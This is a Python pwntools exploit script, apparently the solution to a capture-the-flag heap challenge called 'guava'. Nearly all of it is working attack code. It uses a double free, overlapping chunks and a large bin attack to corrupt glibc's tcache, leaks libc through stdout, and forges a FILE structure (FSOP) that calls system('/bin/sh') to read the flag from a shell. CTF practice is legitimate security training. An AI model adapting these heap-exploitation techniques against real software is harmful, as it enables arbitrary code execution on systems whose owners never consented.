#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 guava
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'guava')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)
docker_id = "a1e5f060b480"
import docker
client = docker.from_env()

context.terminal = ["tmux", "split","-h"]

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        docker_gdb_attach()
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

prompt_prefix = b": "
cmd_prefix = b"> "

def prompt(m,**kwargs):
    r = kwargs.pop("io",io)
    prefix = kwargs.pop("prefix",prompt_prefix)
    line = kwargs.pop("line",True)
    if prefix is not None:
        if line:
            r.sendlineafter(prefix,m,**kwargs)
        else:
            r.sendafter(prefix,m,**kwargs)
    else:
        if line:
            r.sendline(m,**kwargs)
        else:
            r.send(m,**kwargs)
            sleep(0.05)

def prompti(i,**kwargs):
    prompt(f"{i}".encode(),**kwargs)

def cmd(i,**kwargs):
    prefix = kwargs.pop("prefix",cmd_prefix)
    prompti(i,prefix=prefix,**kwargs)

def upk(m,**kwargs):
    return unpack(m,"all",**kwargs)

def printx(**kwargs):
    for k,v in kwargs.items():
        log.critical(f"{k}: 0x{v:x}")

def docker_gdb_attach():
    pid = client.containers.get(docker_id).top()["Processes"][-1][1]
    gdb.attach(int(pid), exe=exe.path, gdbscript=gdbscript)
    sleep(1)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

while True:
    try:
        io = start()
        
        idx = 0
        def alloc(sz,content,offset=0):
            global idx
            curr_idx = idx
            idx += 1
            cmd(1)
            prompti(sz-8)
            prompti(offset)
            prompt(content,line=False)
            return curr_idx
        
        def free(idx):
            cmd(2)
            prompti(idx)

        # setting up libc pointers somewhere accessible as a tcache entries (after large bin attack) for size 0x450, and 0x480
        target = alloc(0x6f0,b"reserved") # reserved for ovf tcache entry later
        alloc(0x20,b"barrier") # reserved for ovf tcache entry later
        free(target)
        target1 = alloc(0x20,p64(0xd5b0)[:2]) # reserved for ovf tcache entry later
        target2 = alloc(0x6f0-0x20,p64(0xd5b0)[:2]) # reserved for ovf tcache entry later
        res1 = alloc(0x20,b"c")
        res2 = alloc(0x30,b"c")
        libc=ELF("./libc.so.6")
        
        # large bin attack
        sz_1 = 0x560
        header_sz = 0x100
        sz_2 = sz_1-0x30 - 0x10
        sz_3 = 0x700
        sz_b = 0x18
        fake_sz = sz_1 - 0x30
        prefix_sz = fake_sz - header_sz
        
        tcache_idxs = []
        for i in range(7):
            tcache_idxs.append(alloc(header_sz,b"tcache"))
        idx_prefix = alloc(prefix_sz,b"a")
        idx0 = alloc(header_sz,b"a")
        idx1 = alloc(sz_1,b"a")
        alloc(sz_b,b"barrier")
        idx2 = alloc(sz_2,b"a",offset=0)
        alloc(sz_b,b"barrier")
        for i in tcache_idxs:
            free(i)
        free(idx1) 
        free(idx0) # consolidate, (house of botcake)-ish to overlap chunks
        idx_overlap = alloc(header_sz+sz_1,
                flat({
                    header_sz-8:fake_sz|1,
                    header_sz-8+fake_sz:0x30|1,
                }))
        free(idx1) # <- DOUBLE FREE
        free(idx_overlap)
        idx_overlap = alloc(header_sz+sz_1,
                flat({
                    header_sz-8:fake_sz|1,
                },))
        free(idx_overlap)
        free(idx_prefix) # consolidate with chunk idx_overlap to make it much bigger and avoid sorting the large bin chunk into unsorted when splitting to get main_arena ptr in bk_nextsize
        
        idx_overlap = alloc(prefix_sz+header_sz+0x10,b"a") # will set bk_next_size to pointer around main_arena
        free(idx_overlap)
        idx_overlap = alloc(header_sz+prefix_sz+0x100,
                flat({
                    prefix_sz+header_sz-8:fake_sz|1,
                    prefix_sz+header_sz+8*3:p64(0xc1c8)[:2], # partial overwrite to point to &mp_->tcache_bins - 0x20
                },))

        free(idx2) 
        idx_3 = alloc(sz_3,b"barrier") # large bin attack

        # libc leak via arbitrary allocations
        free(res2) # set tcache->counts of 0x440 and 0x480 to be non-zero
        free(res1) # set tcache->counts of 0x440 and 0x480 to be non-zero
        alloc(0x440,p64(0)*2 + p64(0xfbad1800))
        alloc(0x480,b"\x00",offset=0x30)
        libc.address = upk(io.recv(8)) - 0x204644
        printx(libc=libc.address)
        free(target1)
        alloc(0x20,p64(libc.sym._IO_2_1_stdout_))
        target = libc.sym._IO_2_1_stdout_
        
        # RCE via arbitrary allocation + FSOP
        def pack_fp(fp,**kwargs):
            suffix = kwargs.pop("suffix",b"")
            for k,v in kwargs.items():
                setattr(fp,k,v)
            return (bytes(fp)+suffix)
        
        fp_ptr = target
        fp = FileStructure()
        fake_vtable_ptr = fp_ptr +0xe0 - 0x68
        pl = pack_fp(fp,flags=0x3b01010101010101,
                _wide_data=fp_ptr+0x10,
                _IO_read_ptr=b"/bin/sh\0",
                _IO_read_end= 0,
                _IO_read_base= 0,
                _IO_write_base=0,
                _IO_write_ptr= 0,
                _IO_write_end= 0,
                _IO_buf_base= 0,
                _IO_buf_end= 0,
                _lock=libc.sym._IO_stdfile_1_lock,
                _IO_save_end=libc.sym.system,
                vtable=libc.address+0x2022b0,
                suffix= p64(libc.sym.system) + p64(0) + p64(fake_vtable_ptr))
        
        alloc(0x440,pl)
        break
    except EOFError:
        io.close()


prompt("cat flag.txt",prefix=None)
io.interactive()

